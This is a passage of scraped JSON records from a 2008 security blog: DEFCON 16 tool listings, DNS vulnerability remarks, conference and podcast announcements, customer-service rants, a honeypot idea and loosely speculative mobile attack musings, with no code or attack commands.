IDS program Homepage Link: http://www.beholderwireless.org/ Email Address: bh@beholderwireless.org ** The Middler – by Jay Beale** Description: The end-all be-all of MITM tools Homepage Link: http://www.themiddler.com/ (Online?) Preface Link: http://www.intelguardians.com/themiddler.html ClientIPS – by Jay Beale Description: An open source inline “transparent” client-side IPS Homepage Link: http://www.ClientIPS.org/ (Online?) ** Marathon Tool – by Daniel Kachakill** Description: A Blind SQL Injection tool based on heavy queries Download Link: http://www.codeplex.com/marathontool Email Address: dani@kachakil.com The Phantom Protocol – by Magnus Brading Description: A Tor-like protocol that fixes some of Tor’s major attack vectors Homepage Link: http://code.google.com/p/phantom Email Address: brading@fortego.se ModScan – by Mark Bristow Description: A SCADA Modbus Network Scanner Homepage Link: http://modscan.googlecode.com/ Email Address: mark.bristow@gmail.com ** Grendel Scan – by David Byrne** Description: Web Application scanner that searches for logic and design flaws as well as the standard flaw seen in the wild today (SQL Injection, XSS, CSRF) Homepage Link: http://grendel-scan.com/ iKat – interactive Kiosk Attack Tool (This site has an image as a banner that is definitely not safe for work! – You have been warned) by Paul Craig Description: A web site that is dedicated to helping you break out of Kiosk jails Homepage Link: http","date":"2008-08-24","objectID":"https://malicious.link/posts/2008/2008824defcon-16-the-tools-not-the-toools-html/:0:0","tags":["Hacking"],"title":"DEFCON 16: The Tools not the Toools","uri":"https://malicious.link/posts/2008/2008824defcon-16-the-tools-not-the-toools-html/"},{"categories":["Hacking"],"content":"So, just monitoring twitter for Defcon tweets and came across this one: Matthewneely status update 878833018 Screencap: Link to video: HERE So what is cool about this tool? It generates an SQL injection that skirts the 64k size limit using MS Debugger on the victim end. And of course the DEFCON 16 via Wired Mag (Artcile) ","date":"2008-08-06","objectID":"https://malicious.link/posts/2008/200886defcon-presents-come-early-html/:0:0","tags":["Hacking"],"title":"Defcon presents come early!","uri":"https://malicious.link/posts/2008/200886defcon-presents-come-early-html/"},{"categories":["Rant"],"content":"I recently was Stumbling and happened across the following video. Now, when people use StumbleUpon they are usually bored and aren’t really contributing to the world as we know it. It strikes me as ironic that I found and watched a video like this, via StumbleUpon. I promise, it is well worth the fraction of a wikipedia project cycle you will utilize on it. My favorite quote out of the whole deal: “Media that is made for you, but does not include you, is not worth sitting still for” Original Link: http://www.clusterflock.org/2008/04/where-do-people-find-the-time.html Part 1: [youtube=http://www.youtube.com/watch?v=AyoNHIl-QLQ\u0026w;=425\u0026h;=344] Part 2: [youtube=http://www.youtube.com/watch?v=jNCblGv0zjU\u0026w;=425\u0026h;=344] ","date":"2008-08-06","objectID":"https://malicious.link/posts/2008/200886where-do-people-find-the-time-html/:0:0","tags":["Rant"],"title":"Where do people find the time?","uri":"https://malicious.link/posts/2008/200886where-do-people-find-the-time-html/"},{"categories":null,"content":" This may not be safe for work, but it’s your call as everyone in my office got quite the kick out of it. Definitely not security related, and _loosely _ tech related (twitter’s use from a mobile). Proceed with caution. ","date":"2008-07-31","objectID":"https://malicious.link/posts/2008/2008731missrftc-makes-twitter-history-html/:0:0","tags":["Funny"],"title":"@MissRFTC makes twitter history","uri":"https://malicious.link/posts/2008/2008731missrftc-makes-twitter-history-html/"},{"categories":["Hacking"],"content":"So, according to my iPhone, the DNS servers that it uses is patched. (209.183.33.23 - schinetdns.mycingular.net) However, when I tried to send an image of the doxpara page through email it gave me an SSL error and asked me to accept the certificate…. Um, no thank you. So, for the time being I will not be checking my email for a while, or for that matter anything I need to authenticate with. Too much? probably, but just erring on the side of caution. I will post the screen caps when I don’t have SSL errors. H.D. Moore actually contacted ATT about the issue. Check out his post to twitter for the response they gave him:H.D. Moore vs. ATT “reads a response from AT\u0026T: ”We will investigate your complaint and take appropriate action.“ DNS server is now offline…” Now I wonder how many iPhones out there have already clicked “Continue” EDIT: Here is a weird thing, as soon as I dropped to the “EDGE” network, the email sent with no errors. So here is the image: (Remember, this was taken while on 3G) ","date":"2008-07-29","objectID":"https://malicious.link/posts/2008/2008729att-partially-patched-yay-html/:0:0","tags":["Hacking"],"title":"ATT partially patched. Yay!","uri":"https://malicious.link/posts/2008/2008729att-partially-patched-yay-html/"},{"categories":null,"content":"It’s almost that time. DefCon is right around the corner and things are coming together nicely. Here is where we stand and a rough schedule of events: Bloggers welcome. I got a lot of feedback asking if it’s just for “Podcasters” but we would like to invite bloggers to participate as well. I-Hacked.com and Astaro are our current sponsors, and I am still waiting on confirmation from two others. We have Skybox 208 all day Saturday. During the day it will be open to all podcasters to record in peace and quite if they wish. We have the following podcasters attending that I know of PaulDotCom - Larry and Paul CyberSpeak - Bret and Ovie (possible) Network Security Podcast Security Justice Securabit SploitCast Security Catalyst (possible) Special Guests Hvensnt from I-Hacked.com Offensive Security Schedule of Events (Saturday) 10 AM to 7 PM - Open to Podcasters Only 7 PM - 8:30 - Setup and Testing for Live show 8:30 - 9:00 - Doors open for audience 9 - 10 - Live Show 10 + After Party We’ll see you there! mubix ","date":"2008-07-28","objectID":"https://malicious.link/posts/2008/2008728podcasters-meetup-defcon-16-update-2-html/:0:0","tags":["Uncategorized"],"title":"Podcaster's Meetup @ DEFCON 16 Update 2","uri":"https://malicious.link/posts/2008/2008728podcasters-meetup-defcon-16-update-2-html/"},{"categories":["Rant"],"content":"So after my last post, which autotwittered, I got a reply from a guy by the name of Frank Eliason, who goes by the handle “ComcastCares” on Twitter. And this is how the converation went: mubix: Blogged Comcast: The start of a new series http://tinyurl.com/6jrvhe 5 days ago comcastcares: @mubix I would like to help. Email me *********[snipped]@cable.comcast.com (new email: We_Can_Help@cable.comcast.com) 5 days ago mubix: @comcastcares it shouldn’t come to the point where you need to help. I expect a certain level of service for the golf time I am paying for about 3 hours later comcastcares: @mubix The golf time? 2 minutes later mubix: @comcastcares the premium that I pay monthly helps pay for Comcast execs trips to the golf course about 1 hour later comcastcares: @mubix Oh! I have not been golfing in a long time. Actually I do not know any golfers here. I guess I should make more friends So after I’m done insulting the guy, he still goes out of his way to help me out. The very next day after this twitter conversation happens, a “gumbling” as my wife put it, contractor came to my house and put the cable in the ground. So I would like to give notice to Comcast: Frank Eliason is the best employee you have, if he every leaves or gets fired, I’m switching providers. To those who have problems with Comcast and their customer support, click the email link above and Frank will fix any problem you have, or at the very least he will know who to contact and with get things actually moving. Thank you Frank. mubix ","date":"2008-07-22","objectID":"https://malicious.link/posts/2008/2008722comcast-cares-html/:0:0","tags":["Rant"],"title":"Comcast Cares?","uri":"https://malicious.link/posts/2008/2008722comcast-cares-html/"},{"categories":["Hacking"],"content":"So, now that your feed reader is full up of all the DNS problems, I would like to present you with one more tidbit. How many of you have checked your iPhone, Blackberry, or other web enabled mobile device against this vulnerability? I did, and wasn’t happy. For more information please check out these links: In depth explination: http://www.mcgrewsecurity.com/?p=151 To check to see if you are vulnerable: http://www.doxpara.com/ http://www.mckeay.net/2008/07/21/patch-dns-now/ http://www.matasano.com/log/mtso/ http://www.doxpara.com/?p=1176 http://blogs.zdnet.com/security/?p=1520 ","date":"2008-07-22","objectID":"https://malicious.link/posts/2008/2008722iphone-att-dns-bad-juju-html/:0:0","tags":["Hacking"],"title":"iPhone + ATT + DNS = Bad Juju","uri":"https://malicious.link/posts/2008/2008722iphone-att-dns-bad-juju-html/"},{"categories":["Rant"],"content":"I am truely getting tired of iPhone “Web Apps”. I created the title like I was going to give them a fair chance, but they truely have ZERO integration into the actual phone. They do have a pretty interface and I have to give props to some of the design developers, but does this seem more of a copout to anyone else? I’ll give an example. I LOVE Remember the Milk. It is probably the best task system out there in my opinion. I have for the longest time tried to get tasks on my phone and have it integrate into my calendar. So I was very excited about the new iPhone and the possibility that there would be a killer app for calendar / todo syncing with the service I already love, RTM. To my shock I found they had a Web App. What does this do for me? I now can add tasks to my to do and RTM can email or text me when something comes up. I find this pointless, because I can simply add tasks with a full qwerty keyboard at the nearest computer with a internet connection. PLUS to add to it, RTM wants me to “Go Pro” in order to… use their WEBSITE? Hmm, pay 25 dollars and use their iPhone friendly web site, or just use their normal site from my iPhone…. I am not against paying for a product, and I am especially not against supporting a developer, but don’t make me pay for VISITING YOUR WEB SITE. I feel that a lot of these “Web Apps” are a complete waste of developers time, instead give me an ACTUAL iPhone App! Now, if Apple is charging all kinds of money to be published to the App Store than I retract all I have said. If not, you are missing the boat people, charge 9.99 a pop and make an iPhone app that is worth downloading. I promise that I won’t be the only one pushing that “Purchase” button. ","date":"2008-07-21","objectID":"https://malicious.link/posts/2008/2008721iphone-apps-vs-iphone-web-apps-html/:0:0","tags":["Rant"],"title":"iPhone Apps vs iPhone Web Apps","uri":"https://malicious.link/posts/2008/2008721iphone-apps-vs-iphone-web-apps-html/"},{"categories":["Rant"],"content":"Now, I don’t like to publicly bad mouth companies, but at some point, Comcast’s lack of “service” has got to stop. Well, let me rephrase that: Comcast needs to be held accountable for their utter lack of due diligence. I have been a Comcast customer by default ever since they swallowed the portion of Adelphia that held my area. I say this because only recently, have I actually had a choice in the matter. So, without further ado, here is my latest Tales from Comcast Customer: Having recently moved, I decided that even though I have a choice, incurring additional “setup” fees for switching services was not something I wanted. So they guy was there 5 days after I moved in, ran the line, and we were hot with both digital cable, and speedy internet service. I came home from work, ran some speed tests and was delighted to see that I had just almost tripled my speeds from my previous residence. Weeks go by, and this line that the Comcast installer ran from the box to my house is still strung across my lawn. I call and they say they will send someone out to put it down as soon as possible. 2 months later, I call again; they cannot see in their system that a request to put a line in the ground was ever submitted. After 20 minutes of trying to ensure that the “Customer Service Representative” fully understood that there was actually, physically, an orange coaxial line, above ground, strung across my front lawn, that was Comcast’s responsibility, she submitted a new request. 1 week after the new request, I come home to a Comcast truck in the driveway. YIPEE!, nope, he was there to fill out the request for a contractor to come and put the line in the ground. So basically he had no purpose in life or in my driveway. 2 weeks after the new request, no contractor, but someone at some point came by my house and spray painted lines on my lawn where my line should be in the ground. (And no, I didn’t miss a call or the contractor coming) 3 weeks after the new request, the wife is fed up and she has me call Comcast after our TV goes out for no apparent reason. Guess what I got when I called? A busy signal. That just doesn’t compute in my head. How is Comcast going to present me with a busy signal for a 24 hour service line? Anyways, the next day I call and actually get through. Now guess what they told me? Nope, they had the request, but it was for September!? The “Customer Service Representative” was nice enough to move it up to this Saturday. To Be Continued…. Once this event has run its course, it will be filed under “Stupid People” in the links menu, under “Tales of a Comcast Customer: EP1” ","date":"2008-07-17","objectID":"https://malicious.link/posts/2008/2008717comcast-the-start-of-a-new-series-html/:0:0","tags":["Rant"],"title":"Comcast: The start of a new series","uri":"https://malicious.link/posts/2008/2008717comcast-the-start-of-a-new-series-html/"},{"categories":null,"content":"To All, Well, this year marks the first annual DEFCON Podcaster’s Meetup, and we will be doing it in STYLE. For those of you who made it out to the second annual Podcaster’s Meetup at ShmooCon, we ran into some hitches (like sound), but as we grow, so do the problems. Let me start off by telling you some sweet news. We are nailing down time in a SkyBox! So we will have plenty of room, piece and quite for recording, and a nice view over the con, plus NO WALKING TO THE PARTY. We will have it right there in the box! To Podcasters, I need to know as soon as possible how many already are set to go, those intending on getting set up and those who can’t make it. Also, if the idea of getting in free pushes you over the ‘going’ edge, we may be able to work that as well. Also, on that note, please forward this, like a Microshaft chain letter to any other podcasters that may be going, give them my email address so we can start a dialog and work out any kinks in their plans. To Potential Sponsors, I have included you in this email because I want you to understand the possibilities of this event. It will be at DEFCON 16. The most well known security / hacker conference. If you want to send fliers, stickers, drinks, money, or prizes, we can work out the details. We will be recording and broadcasting a live show from DEFCON which usually brings in 100 local and up to 500 remote viewers. It is then rebroadcast on which ever podcasters or vidcasters distribution that wants to and that could range from 10,000 to 1 million potential viewers. As information is updated and confirmations come in, I will be updating the collaboration site: http://www.podcastersmeetup.com/ . Feel free to post or forward this information on to who every you like. If you would like an account in order to broadcast your presence at the event, please signup and I will upgrade your user level. For those who may not know: DEFCON 16: August 8-10, 2008 Thank you for your time, and I look forward to hearing from you, Rob Fuller, a.k.a. Mubix ","date":"2008-07-09","objectID":"https://malicious.link/posts/2008/200879podcasters-meetup-defcon-16-html/:0:0","tags":["Breaking News"],"title":"Podcasters Meetup @ DEFCON 16","uri":"https://malicious.link/posts/2008/200879podcasters-meetup-defcon-16-html/"},{"categories":["Hacking"],"content":"Since I wasn’t able to catch the commenter before they went offline I will leave it anonymous but they make a good point about my Crazed Bovine Traversal post: In response to your “Crazed Bovine Traversal” blog post, a ringtone virus would likely depend upon some sort of code execution bug in the audio parsing code of the mobile device. Propagation could simply be done via text messaging or web site. It’s possible but to be honest sort of unlikely that it would last long. Most exploits for these types of vulnerabilities would be targeted towards a specific mobile device but you could always do something like… – Anonymous The response was never completed, but I would like to pose this question. Wouldn’t it be a specific mobile OS not just a specific device? I mean, how often does your phone say. “Patch available, press here to update”. Not to be cynical, but even Microsoft Windows gets updates faster than most phones. I have absolutely no knowledge of how a mobile OS works or the versioning behind them. So please correct me if I am wrong. To be honest, the iPhone, from what I have seen, gets more updates than Windows Mobile and Blackberry combined. I mean just search for Blackberry 4.3 and AT\u0026T. That update has been out for something like a year, and AT\u0026T still won’t release it to it’s customers. ","date":"2008-06-29","objectID":"https://malicious.link/posts/2008/2008629cbt-response-html/:0:0","tags":["Hacking"],"title":"CBT Response","uri":"https://malicious.link/posts/2008/2008629cbt-response-html/"},{"categories":null,"content":"On a Dutch news site there was a story about a hacker that stole 50,000 credit cards (well, the information at least) and also stole a prerelease version of Quake Wars. What do you think made the title line? Quake Wars. That puts things in perspective on what is impotant. Big companies like the one that made Quake Wars have the liquid budget to chase this guy down, but the 50,000 individuals don’t. Is it bad that my sole thought after reading this article is wondering how he got into the Id Software servers? Source: HERE In other hacker news, “Hacker reveals flaws in school website security” “Woman accused of hacking Houston organ bank indicted” ","date":"2008-06-29","objectID":"https://malicious.link/posts/2008/2008629hacker-steals-quake-html/:0:0","tags":["Breaking News"],"title":"Hacker steals Quake","uri":"https://malicious.link/posts/2008/2008629hacker-steals-quake-html/"},{"categories":null,"content":"So, I made a new category basically for posts that I want to keep for myself and also post for other people not to have as hard a time finding: Archiving. In Ubuntu I have always set a password for root and “su -” up to root to run things that needed root access. Well after watching IronGeek’s latest video on Labrea (click here to watch the video). I gleaned a new way to get to a root prompt without having to set a password and su up each time. He called it SUDO Interactive mode. And al you do is: sudo -i That’s it, and you are good. Just thought I would share. ","date":"2008-06-27","objectID":"https://malicious.link/posts/2008/2008627interactive-mode-sudo-html/:0:0","tags":["Archiving"],"title":"Interactive Mode SUDO","uri":"https://malicious.link/posts/2008/2008627interactive-mode-sudo-html/"},{"categories":null,"content":"Just wanted to pimp Paul from PaulDotCom’s class coming up here shortly. Also, to register go to http://www.pauldotcom.com/sans and help their podcast out. SANS Institute - SANSFIRE 2008 Wednesday, July 23, 2008 : 9am - 5pm Paul Asadoorian, Defensive Intuition 6 CPE Credits ","date":"2008-06-24","objectID":"https://malicious.link/posts/2008/2008624network-security-projects-using-hacked-wireless-routers-html/:0:0","tags":["Pimping"],"title":"Network Security Projects Using Hacked Wireless Routers","uri":"https://malicious.link/posts/2008/2008624network-security-projects-using-hacked-wireless-routers-html/"},{"categories":null,"content":"Now that everyone and their mother has posted about Back|Track Final being released I feel that I am safe in disclosing that information. But on to the topic, with said release, the folks over at Paterva have released a “Community” edition of Maltego. Straight from the horses mouth, here are the limitations: ","date":"2008-06-23","objectID":"https://malicious.link/posts/2008/2008623maltego-goes-communal-html/:0:0","tags":["Pimping"],"title":"Maltego Goes Communal","uri":"https://malicious.link/posts/2008/2008623maltego-goes-communal-html/"},{"categories":null,"content":"Limitations The Community Edition is limited in the following ways: A 15second nag screen Save and Export has been disabled Limited zoom levels Can only run transforms on a single entity at a time Cannot copy and paste text from detailed view Transforms limited to 75 per day Throttled client to TAS communication Also, directly on the heals of this release is a community forums! Which haven’t quite been linked to from the main site, but I HAVE AUTHORIZATION THIS TIME!… not going to make the same mistake twice. Anyways, go check it out. ","date":"2008-06-23","objectID":"https://malicious.link/posts/2008/2008623maltego-goes-communal-html/:0:1","tags":["Pimping"],"title":"Maltego Goes Communal","uri":"https://malicious.link/posts/2008/2008623maltego-goes-communal-html/"},{"categories":["Hacking"],"content":"So I had another one of my harebrained ideas and it goes something like this: Do you use your “DMZ” feature on your router at home? If you do, you shouldn’t. It’s like putting your computer directly on the net. Bad idea all around. Well, instead of having all those packets hit a brick wall, why not put them to good use? So, create a Virtual Machine that you have running on your system and point your DMZ switch at. Here are the specs: Has an IP (duh?) Low memory and cpu usage. You don’t want this thing inconveniencing the user, or else it will never be widely used. At all costs, does not allow anything it sucks up to get out. Something like a hard iptables block of everything outbound except it’s packaged dumps Has to be able intelligent enough to correlate streams and sessions There are probably more things that it could do, but if this could be widely used, anyone trying to *ware analysis would have more data than they would know what to do with. You start to correlate data with mass amounts of people, you can make block lists, and virus definitions, and all kinds of good stuff. This is the kind of information that big vendors like Symantec and McAfee already have from their products being installed on your systems. Although, they don’t have the DMZ pointed at them. Hmm, there would also have to be some kind of sanitization. That way no P2P or otherwise not so legal traffic would be published… If you have ideas on how that portion could be done, please post a comment. ","date":"2008-06-23","objectID":"https://malicious.link/posts/2008/2008623distributed-honeypot-project-html/:0:0","tags":["Hacking"],"title":"Distributed Honeypot Project","uri":"https://malicious.link/posts/2008/2008623distributed-honeypot-project-html/"},{"categories":["Hacking"],"content":"So I was at a ‘talk’ recently where the topic was geared toward technically inclined, but the whole talk was geared toward managers and low level IT bubbas, if you will. But as I sat there stabbing myself in the eye with my pencil (hence the mad cow reference) I can up with some hair brained ideas. Now, some of these ideas might already be out there or thought of, and I haven’t googled any of them, just wanted to write them down somewhere for people to comment on. Ringtone viruses: Now this was by no means an idea that I had but it was mentioned during the talk and I was intrigued how it worked or if the presenter just pulled it out of thin air. The reason I bring it up, other than for someone to explain it to me, but for reference later. iPhone SDK based GPS hacking: So here is an idea, with the new craze that the new cheaper iPhone is going to create, what is stopping the mal-ware writers from writing an cool app that you can download, and now since you are connected to “MobileMe” it sends all of you email, contacts, files, and calendars to a new source. Plus now that it syncs everywhere, you think you are syncing with the “cool” apps servers and what they are doing a completely new form of spyware. They have a gps location on you, read your email, and have all of your corporate documents that you sync to iDisk. Talk about a Social Engineer/Phishers dream. Contact Phishing: To keep going down the route we are already on, how often do you check to make sure that the phone number you have for “bank” is the correct number in your contacts list? What if someone using one of the previously mentioned avenues of attack, changed that number to another number and set up a Phishing 1800 line? Now, instead of having a browser to tell you that you are on the wrong server, you have to trust….. ? Exactly. So to completely derail this post off the Mobile Hacking topic. I am looking for a good reference on Unix/FreeBSD crypto. I have a friend that is completely convinced that even if someone has your /etc/shadow file, that you are not in any danger. Help me out guys, a link, and explanation, anything would work. ","date":"2008-06-17","objectID":"https://malicious.link/posts/2008/2008617crazed-bovine-traversal-html/:0:0","tags":["Hacking"],"title":"Crazed Bovine Traversal","uri":"https://malicious.link/posts/2008/2008617crazed-bovine-traversal-html/"},{"categories":null,"content":"This was originally posted at http://www.jpugh.org/2008/01/vonage-and-ekiga-on-suse-linux.html I had to find it via google cache as the page is no longer there or has just been down for the past week. So I am reposting it for reference: ","date":"2008-06-15","objectID":"https://malicious.link/posts/2008/2008615vonage-and-ekiga-on-suse-linux-html/:0:0","tags":["Uncategorized"],"title":"Vonage and Ekiga on SUSE Linux","uri":"https://malicious.link/posts/2008/2008615vonage-and-ekiga-on-suse-linux-html/"},{"categories":null,"content":"Vonage and Ekiga on SUSE Linux For the first time ever, I lost my cell phone. No freakin’ idea where it went and this IS the first time I have every lost a phone. Quite pissed. Regardless…in my searchings for a better way I figured I’d take a look at VOIP using Ekiga. I have been a Vonage user for several years now so that was my first stop. I found an article that outlined using kphone with Vonage so I started digging. First, you must have a softphone number from Vonage. It’s 9.99 per month and you can register for one at Vonage (do email me as you will get me a free month and I can get you an extra month free!). Once you have signed up for a softphone number and received all of the gory details simply open Ekiga and input the following into a new account: Account name - I used Vonage Registar - sphone.vopr.vonage.net:5061 User - enter your complete softphone number - don’t forget the “1″ Password - enter the password Vonage provided. Once you click the checkbox to activate it you will see “Registered to sphone.vopr.vonage.net” and you are all set. Enter in a phone number and enjoy calls through Vonage on Linux!! ","date":"2008-06-15","objectID":"https://malicious.link/posts/2008/2008615vonage-and-ekiga-on-suse-linux-html/:0:1","tags":["Uncategorized"],"title":"Vonage and Ekiga on SUSE Linux","uri":"https://malicious.link/posts/2008/2008615vonage-and-ekiga-on-suse-linux-html/"},{"categories":null,"content":"A low doorway in the east wall allows access to the example room, a glowing portal in the north wall leads to the mortal start area, and to the northeast is the quiet room, the door of which is currently open. The LIMA mudlib greeter stands here, smiling politely. There’s a Camaro Z28 parked here. Sco’s Pet There are many clear bottles here. A map of Lima Bean is pinned to the wall. There’s a Camaro Z28 parked here. Onoz the title-less [fully documented] [idle 1w] Acidtrux of Anomaly [idle 3d] The ghost of Jetboy [idle 1d] Boo the title-less [idle 1w] Lollerskater the title-less [fully documented] [idle 3d] Xdne the title-less [fully documented] [idle 1w] Mudos the title-less [idle 1w] Rarry the title-less [idle 3d] Skout the title-less [fully documented] [idle 1d] Tuning in the newbie channel (newbie /on) Tuning in the gossip channel (gossip /on) get in Camaro Z28 You can’t get in Camaro Z28. hello Getting desperate? no I don’t know the word: no. why not You can’t be serious. I am I don’t know the word: I. why Gamedriver tell you, “Why the hell not?! Let’s shutdown…” ok You ok. yes You exclaim, “YES!” eat Sco’s Pet There is no Sco’s Pet here. eat Sco There is no Sco here. jump You jump up and down. duck You duck. do the thriller I don’t know the word: do. cry You cry. Hi Ken Shoto… I know one of you is seeing this. There is no Shoto… I know one of you is seeing this. here. hahah I don’t know the word: hahah. why not An interesting idea. thank you You thank you. you’re welcome There is no welcome here. Now don’t start that again! I don’t know the word: Now. quit You have left KMud. Connection closed by foreign host. ","date":"2008-06-12","objectID":"https://malicious.link/posts/2008/2008612talking-to-mud-html/:0:0","tags":["Funny"],"title":"Talking to Mud","uri":"https://malicious.link/posts/2008/2008612talking-to-mud-html/"},{"categories":["Rant"],"content":"So, I have to apologize to the whole Security community for my idiocy. Yesterday I was made aware of a post about Backtrack 3 Final coming out. The link I received was a link to Mut’s blog. While reading the post it mentioned something about an early IRC release. Proceeding to IRC I found a direct link to the ISO in the topic. Excited about the release I failed to read the rest of the topic in IRC mentioning that they wanted it to stay within the IRC community. I then started sending out a link to Mut’s post, and the link to the ISO out to my friends and the Wifi Sec mailing list. Today at some point the ISO was pulled offline, according to an email I received, due to my Wifi Sec posting. I am sorry to everyone in the Remote Exploit community, and especially Mutts, Max, and MjM. So, if you read this and see me at one of the conferences. Mention this post’s title and I owe you a beer. ","date":"2008-06-11","objectID":"https://malicious.link/posts/2008/2008611i-am-jacks-unpropitious-excitement-html/:0:0","tags":["Rant"],"title":"I am Jack's unpropitious excitement","uri":"https://malicious.link/posts/2008/2008611i-am-jacks-unpropitious-excitement-html/"},{"categories":["Rant"],"content":"Recently I have been hearing a lot of innovators posting to their blogs that they are pursuing new employment with Microsoft, and I wonder if they are making sneaky power plays into the Open Source market. Taking it’s best projects and plucking their leads. For example: KnoppMyth Creator: http://mysettopbox.tv/index.html#News EDIT: The above article seems to be an April Fools joke that I was late to the party on. Thanks to Mark for calling me out. Castle Cops - Owner/Operator - Paul Laudanski http://www.castlecops.com/t223152-Must_Read_Important_Announcement.html Now, don’t get me wrong, everyone needs their family and Open Source is a thankless job sometimes. I am not trying to dog on them for going Microsoft. I am just wondering if they are doing this to give these gents a job and make their product better, or just get rid of supporting competition. Just my rant on what I am seeing. Sounds a bit like dvorak.org/blog eh? – mubix ","date":"2008-06-08","objectID":"https://malicious.link/posts/2008/200868microsoft-making-secret-power-plays-html/:0:0","tags":["Rant"],"title":"Microsoft making secret power plays?","uri":"https://malicious.link/posts/2008/200868microsoft-making-secret-power-plays-html/"},{"categories":["Rant"],"content":"What happens when the lights go out. Power is gone and all you have left is your thoughts and a laptop that’s battery is quickly dieing? You write. Movies will take up too much power and it’s too dark to read so you write. What do you write about, does it really matter? You write. I am a part of a great many projects but I can’t say that I have contributed to them very much. But I would like to in this post, since I have the time all of a sudden, take the time to acknowledge the real people who are making things happen: First of we have Roelof Temmingh. His hard work and dedication to his project Maltego has created something as revolutionary as the search engine. Now, you may say that that is one hell of a statement and shouldn’t be tossed around like an Emmy. I am here to assure you I am not. Just as ArcSight, if implemented correctly and cared for is one of the greatest tools a Information System Incident Responder can have, Maltego is the information gatherer’s most valuable asset. From Intel bubbas to Social Engineers to Private Investigators. This tool is not something you can live without any longer. Why? Because your opponent is already using it. http://www.paterva.com/ The next project I would like to talk about is the WiFi Security mailing list. Dninja and Joshua Wright as some of the brightest minds in the field of 802.11. Joshua Wright is well recognized, but I think Dninja is less so. Both Josh and Dninja are working on incorporating Karma into embedded devices, mainly the Fon Router. The Fon is a extremely small form factor router that still has enough embedded memory to be useful for modding. Their continued research, by all of those in the WiFi Security mailing list, directly impact the 802.11 field. That impact is seen in the increased security we are seeing in WiFi devices and software every day. http://www.securityfocus.com/archive/137/description The Mal-Aware team. Lance James and the gents over at Castle Cops are the main players in this team but collaboration from around the world is done on these mailing lists. Closely working with the FBI and other federal and foreign agencies. The brain power that make up the list of email addresses joined together in this list could swell any room. Like mythological super heroes, they dedicate their free time to making the internet a safer place each and every day. [ http://www.mal-aware.org/ ](http://www.mal-aware.org/) Last but not least is the crew over at Hak.5. Darren, Wess, Ally, Paul, and the latest addition Matt. I probably wouldn’t be as ingrained in the “Hacker” world as I am now without these guys. The videos they produce on such a limited budget are entertaining and, in my opinion, rival the professionalism of Hollywood. What they produce is always innovative and informative. Even if they mod the Guitar Hero guitar every other episode. Even though they criticism from all angles, they continue to produce and put out a video podcast that is as of yet unmatched in it’s market. http://www.hak5.org The reason I am writing this post, other than boredom, is to sort of tip my hat in humility to these innovators. Some of the readers of my blog think highly of me. I wish only to transfer that respect to those who deserve it. I am humbled to be apart of such amazing projects and be witness to their impact on the world. – Rob Fuller (a.k.a. Mubix) P.S. So basically, buy Maltego (or get your company/school to), join the WiFi Sec and Mal-Aware mailing lists, and watch Hak.5. Support these projects in any way you can, because they have already supported you in one way or another. ","date":"2008-06-06","objectID":"https://malicious.link/posts/2008/200866creators-of-new-html/:0:0","tags":["Rant"],"title":"Creators of New","uri":"https://malicious.link/posts/2008/200866creators-of-new-html/"},{"categories":null,"content":"The videos from ShmooCon 2008 have hit the shelves. Go download them at: http://www.shmoocon.org/2008/videos/ Digg It EDIT: As of the time of this post, some of the videos are incorrectly named. Here is the 1-\u003e 1: Correctly Named: 21st Century Shellcode for Solaris Advanced Protocol Fuzzing - What We Learned when Bringing Layer2 Logic to SPIKE land Backtrack Demo - “Hacking and Stuff” Bake Not (Fried, spelling error on filename) Fired - Performing Unauthorized Phishing Closing Remarks Forensic Image Analysis for Password Recovery (same video is also under another name below) Got Citrix Hack it! Hacking the Samurai Spirit Keynote Address - Alex Halberman Legal Issues for Bot-Net Researchers and Mitigators Malware Software Armoring Circumvention (same video is also under another name below) On the Social Responsbility of Hackers - Hacker Panel Opening Remarks Path X - Explosive Security Testing Using Xpath PEAP Pwned Extensible Authntication Protocol Practical Hacker Crypto SIPing Your Network The Geek and the Gumshoe They’re Hacking Our Clients - What are we focusing on Servers? (same video is also under another name below) TL1 Device Security (same video is also under another name below) Using Aspect Oriented Programming to Prevent App Attacks Virtual Worlds - Real Exploits VOIP Penetration Testing Lessons Learned Web Portals - Gateway to Information or Hole in Our Perimeter Defenses Why are Databases so Hard to Secure Named: Flash Drives and Solid State Drives Data Recovery Comparison to Hard Drives **Actually: **Hacking Windows Vista Security Named: Active 802.11 Fingerprinting **Actually: **Using Aspect Oriented Programming to Prevent App Attacks Named: Own the Con **Actually: **TL1 Device Security Named: A Hacker Looks Past 50 **Actually: **RenderMan’s: How do I Pwn Thee Named: I will be your Eyes and Hands Actually: Malware Software Armoring Circumvention Named: Intercepting Mobile Phone GSM Traffic Actually: Forensic Image Analysis for Password Recovery Named: Passive Host Characterization Actually: They’re Hacking Our Clients - Why are we focusing on Servers Named: Smarter Password Cracking Actually: Practical Hacker Crypto Named: Vulncatcher - Fun with Vtrace and Programmatic Debugging Actually: Path X - Explosive Security Testing Using XPath Named: When Lawyers Attack! Dealing with the New Rules of Electronic Discovery Actually: Legal Issues for Bot-Net Researchers and Mitigators Named: You Must Be This Tall to Ride the Security Ride Actually: Closing Remarks ","date":"2008-06-01","objectID":"https://malicious.link/posts/2008/200861shmoocon-2008-videos-hit-the-shelves-html/:0:0","tags":["Uncategorized"],"title":"ShmooCon 2008 Videos Hit the Shelves","uri":"https://malicious.link/posts/2008/200861shmoocon-2008-videos-hit-the-shelves-html/"},{"categories":["Rant"],"content":"Oregon’s State Legislature passed a law that provides a full-tuition waiver for a bachelor’s or master’s degree at an Oregon University System institution for children or spouses of service members who died on active duty, became 100 percent disabled in connection with military service, or died as a result of a disability sustained on active duty My home state rocks. Military.com’s Writeup | digg this story ","date":"2008-05-06","objectID":"https://malicious.link/posts/2008/200856oregon-offers-tuition-waiver-html/:0:0","tags":["Rant"],"title":"Oregon Offers Tuition Waiver","uri":"https://malicious.link/posts/2008/200856oregon-offers-tuition-waiver-html/"},{"categories":["Rant"],"content":"Wow. I have to admit, they did the Facebook chat right. I like how it looks and how it works. I would only change one this and allow chats to disembark from the status bar, but other than that, congrats. It is actually keeping me on Facebook longer. Enough brown nosing, here are the pros and cons: PRO: very well done layout - clean, crisp and not in the way CON: I have no idea when one of my friends sign on or off, it would be nice to have to show something simple as - Bob signed on, and have it as an option to turn off for those who have reached their 5000 friend limit. PRO: I now have access to all of those old friends and people that I have lost touch with over the years and didn’t know their email or IM address. This was already the case, but IMs are much more inviting to use. CON: Like I said above, it would be nice if I could dock and undock the IM windows. being stuck to the bottom kinda gets annoying. I still think that Facebook is littered with a lot of useless apps and spam, but the IM ability is helping to ween me back into trying and cleaning up my profile. EDIT:Alright, either the Facebook code 